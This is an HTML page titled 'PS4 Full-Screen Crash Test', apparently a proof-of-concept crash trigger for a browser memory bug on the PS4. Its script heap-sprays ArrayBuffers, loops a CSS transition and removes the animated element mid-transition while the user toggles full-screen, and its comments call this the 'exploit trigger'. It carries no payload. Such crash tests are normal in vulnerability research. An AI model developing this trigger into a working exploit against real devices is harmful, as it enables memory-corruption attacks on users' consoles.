<!DOCTYPE html>
<html>
<head>
  <title>PS4 Full-Screen Crash Test</title>
  <style>
    #box {
      width: 100px;
      height: 100px;
      background: red;
      transition: transform 0.5s linear;
      position: absolute;
      left: 0;
      top: 50%;
    }
    #status {
      font-family: Arial;
      color: white;
      background: black;
      padding: 10px;
      position: fixed;
      top: 0;
      left: 0;
      z-index: 9999;
    }
  </style>
</head>
<body style="background: #000; height: 200vh;"> <!-- Extra height for scrolling -->
  <div id="box"></div>
  <div id="status">CLICK TO START | WAIT FOR 'CRASH NOW!'</div>

  <script>
    const box = document.getElementById('box');
    const status = document.getElementById('status');
    let isTransitioning = false;

    // Heap spray to increase memory pressure
    function heapSpray() {
      window.spray = [];
      for (let i = 0; i < 500; i++) {
        window.spray.push(new ArrayBuffer(0x1000));
      }
    }

    // Reset box position and restart transition
    function restartTransition() {
      box.style.transform = 'translateX(0)';
      setTimeout(() => {
        box.style.transform = 'translateX(300px)';
        isTransitioning = true;
        status.textContent = "TRANSITIONING... WAIT FOR 'CRASH NOW!'";
      }, 10);
    }

    // Main exploit trigger
    function triggerExploit() {
      heapSpray();
      restartTransition();

      // Loop the transition to prolong vulnerable state
      setInterval(restartTransition, 1000);

      // Schedule the forced reflow + crash window
      setTimeout(() => {
        status.textContent = "CRASH NOW! ENTER/EXIT FULL-SCREEN!";
        box.remove();
        document.body.offsetHeight; // Force reflow
      }, 2000); // Adjusted delay for PS4's slow full-screen
    }

    // Start on click
    document.body.addEventListener('click', triggerExploit);
  </script>
</body>
</html>
